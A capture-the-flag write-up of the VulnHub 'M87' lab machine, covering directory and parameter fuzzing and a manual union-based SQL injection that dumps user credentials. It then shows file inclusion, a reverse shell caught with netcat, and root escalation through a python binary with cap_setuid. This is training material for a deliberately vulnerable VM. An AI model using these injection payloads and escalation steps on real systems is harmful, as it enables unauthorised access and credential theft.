---
layout: "post"
title: "M87 vulnhub Writeup"
categories: [vulnhub, Easy]
tags: [sqli, lfi, wfuzz]
---
M87 was an easy box. It start with finding directories. Then we fuzz the hidden parameters. `id` parameter was vulnerable to `sqli` and `file` vulnerable to `LFI`. With this two vulnerabilities we find out usernames and passwords. Using port 9090 we get the shell on box. Privesc to root by using `capabilities`. In this blog I tried to explain how to dump data manually.

# Summary
- Portscan
- Running gobuster
- Fuzzing parameters
- Dump database
- Local File Inclusion
- Loggin to Port 9090
- Getting Reverse shell
- User Flag
- Privsec to Root
- Final Flag

# Recon

## Portscan
```
Nmap scan report for 192.168.0.2
Host is up (0.00027s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE         VERSION
22/tcp   filtered ssh
80/tcp   open     http            Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: M87 Login Form
9090/tcp open     ssl/zeus-admin?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 400 Bad request
|     Content-Type: text/html; charset=utf8
|     Transfer-Encoding: chunked
|     X-DNS-Prefetch-Control: off
|     Referrer-Policy: no-referrer
|     X-Content-Type-Options: nosniff
|     Cross-Origin-Resource-Policy: same-origin
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>
|     request
|     </title>
|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <style>
|     body {
|     margin: 0;
|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
|     font-size: 12px;
|     line-height: 1.66666667;
|     color: #333333;
|     background-color: #f5f5f5;
|     border: 0;
|     vertical-align: middle;
|     font-weight: 300;
|_    margin: 0 0 10p
| ssl-cert: Subject: commonName=M87/organizationName=662b442c19a840e482f9f69cde8f316e
| Subject Alternative Name: IP Address:127.0.0.1, DNS:localhost
| Not valid before: 2020-11-06T13:05:35
|_Not valid after:  2021-11-06T13:05:35
|_ssl-date: TLS randomness does not represent time

```


## Website Recon:
We have login page on the website. The forgot password link is not functional (it points to /#).

![homepage](/assets/img/m87/homepage.png)

## Gobuster
I spend some time on login page to find out vulnerabilities, but no luck. So I used gobuster to find out directories.
```
$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.223/ -o main-go.out
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.223/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/29 12:33:45 Starting gobuster
===============================================================
/admin (Status: 301)
/assets (Status: 301)
/LICENSE (Status: 200)
/server-status (Status: 403)
``` 

Here I found `/admin` dir which is another login page.
![admin-dir](/assets/img/m87/admin-dir.png) 

Again I run gobuster on `/admin` dir and found one `/backup` dir.
```
$gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.1.223/admin/ -o admin-go.out
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.1.223/admin/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/29 12:34:21 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/backup (Status: 301)
```

Here we found another login page.

![backup-login](/assets/img/m87/backup-login.png)

Till now we have 3 login pages
- http://192.168.1.223/
- http://192.168.1.223/admin/
- http://192.168.1.223/admin/backup/

## Finding parameters
Now I tried to fuzz more parameter on each page using `wfuzz`. Here I used `SecLists/Discovery/Web-Content/burp-parameter-names.txt` wordlist to fuzz.
```
$wfuzz --hw 161 -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.1.223/admin/backup/?FUZZ=

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.223/admin/backup/?FUZZ=
Total requests: 2588

===================================================================
ID           Response   Lines    Word     Chars       Payload        
===================================================================

000000001:   200        87 L     190 W    4560 Ch     "id"           

Total time: 5.490480
Processed Requests: 2588
Filtered Requests: 2587
Requests/sec.: 471.3613
```
Great, we found new parameter `id` on `http://192.168.1.223/admin/backup/?id=`.
When I open the url (http://192.168.1.223/admin/backup/?id=) in browser it shows the mysql error.

![mysql-error](/assets/img/m87/mysql-error.png)

# Sql Injection

Now I started to dump the data from server.
You can use sqlmap to dump the data, but here I dumped all data manually.

**i) Finding total number of COLUMNS used in sql query.**

To find out total number of columns in sql query I used `order by`. 
```
http://192.168.1.223/admin/backup/?id=99 or 1=2 order by 1
```
![m1](/assets/img/m87/m1.png)

```
http://192.168.1.223/admin/backup/?id=99 or 1=2 order by 2
```
![m2](/assets/img/m87/m2.png)

**ii) Database Name:**

```
http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select database())
```
![m3](/assets/img/m87/m3.png)

**iii) Now get Tables Names.**

To find out the table names we need to query table `tables` which is part of `information schema` database.

```
http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select table_name from information_schema.tables where table_schema='db' limit 0,1)
```
![m4](/assets/img/m87/m4.png)

We found 1 table: `users`

**iv) Extract the columns of table users:**
```
http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 0,1)
```
![m6](/assets/img/m87/m6.png)
```
http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 1,1)
```
![m7](/assets/img/m87/m7.png)
```
http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 2,1)
```
![m8](/assets/img/m87/m8.png)

```
http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select column_name from information_schema.columns where table_schema='db' and table_name='users' limit 3,1)
```
![m9](/assets/img/m87/m9.png)

The columns of table users are:
- id
- email
- username
- password

**v) Dumping all data**

The following payload extract first entry from table. In order to dump all the data we need to increase limit squentially.
```
http://192.168.1.223/admin/backup/?id=99 or 1=2 union select (select concat(id," ",email," ",username," ",password) from users limit 0,1)
```
![m10](/assets/img/m87/m10.png)

In this way you can extract all the data from mysql database manually.
The final table is:

|Id | Email | Password | Username|
| ----- | -------------- |---------- | ---------- |
|1|jack@localhost|gae5g5a|jack|
|2|ceo@localhost|5t96y4i95y|ceo|
|3|brad@localhost|gae5g5a|brad|
|4|expenses@localhost|5t96y4i95y|expenses|
|5|julia@localhost|fw54vrfwe45|julia|
|6|mike@localhost|4kworw4|mike|
|7|adrian@localhost|fw54vrfwe45|adrian|
|8|john@localhost|4kworw4|john|
|9|admin@localhost|15The4Dm1n4L1f3|admin|
|10|alex@localhost|dsfsrw4|alex|


I tired this creds on different login panels but no luck.
# LFI

With another parameter `file` we can read local files.

![file](/assets/img/m87/file.png)

Here we found system user `charlotte`.

# Port 9090
On port 9090 we have login page.

![9090](/assets/img/m87/9090.png)

Here I tried username `charlotte` and password `15The4Dm1n4L1f3` to login.

![login1](/assets/img/m87/login1.png)

Now we can access `terminal`.

![terminal](/assets/img/m87/terminal.png)

# Reverse Shell
Now we can get reverse shell using the terminal window.

![rce](/assets/img/m87/rce.png)
```
┌─[hitesh@parrot]─[~/boxes/vulnhub/m87]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.1.222] from (UNKNOWN) [192.168.1.223] 32832
python -c 'import pty;pty.spawn("/bin/bash")'
charlotte@M87:~$ ^Z
[1]+  Stopped                 nc -nvlp 4444
┌─[✗]─[hitesh@parrot]─[~/boxes/vulnhub/m87]
└──╼ $stty raw -echo
┌─[hitesh@parrot]─[~/boxes/vulnhub/m87]
└──╼ $nc -nvlp 4444

charlotte@M87:~$ export TERM=xterm
charlotte@M87:~$ 
```

# Flag 1
```
charlotte@M87:~$ cat local.txt 
29247ebdec52ba0b9a6fd10d68f6b91f
``` 
# Privesc to Root
I upload linpeas.sh on box and run it. 
```
[+] Capabilities
/usr/bin/old = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
We found that `/usr/bin/old` have `cap_setuid` capabilities.
When I run the /usr/bin/old found that it running python.
```
charlotte@M87:~$ /usr/bin/old
Python 2.7.16 (default, Oct 10 2019, 22:02:15) 
[GCC 8.3.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 
```
Now it's very easy to launch the shell using python as root user.
```
>>> import os
>>> os.setuid(0)
>>> os.system('/bin/bash')
root@M87:~# 

```
# Root Flag
```
root@M87:/root# cat proof.txt 


MMMMMMMM               MMMMMMMM     888888888     77777777777777777777
M:::::::M             M:::::::M   88:::::::::88   7::::::::::::::::::7
M::::::::M           M::::::::M 88:::::::::::::88 7::::::::::::::::::7
M:::::::::M         M:::::::::M8::::::88888::::::8777777777777:::::::7
M::::::::::M       M::::::::::M8:::::8     8:::::8           7::::::7
M:::::::::::M     M:::::::::::M8:::::8     8:::::8          7::::::7
M:::::::M::::M   M::::M:::::::M 8:::::88888:::::8          7::::::7
M::::::M M::::M M::::M M::::::M  8:::::::::::::8          7::::::7
M::::::M  M::::M::::M  M::::::M 8:::::88888:::::8        7::::::7
M::::::M   M:::::::M   M::::::M8:::::8     8:::::8      7::::::7
M::::::M    M:::::M    M::::::M8:::::8     8:::::8     7::::::7
M::::::M     MMMMM     M::::::M8:::::8     8:::::8    7::::::7
M::::::M               M::::::M8::::::88888::::::8   7::::::7
M::::::M               M::::::M 88:::::::::::::88   7::::::7
M::::::M               M::::::M   88:::::::::88    7::::::7
MMMMMMMM               MMMMMMMM     888888888     77777777


Congratulations!

You've rooted m87!

21e5e63855f249bcd1b4b093af669b1e

mindsflee
```
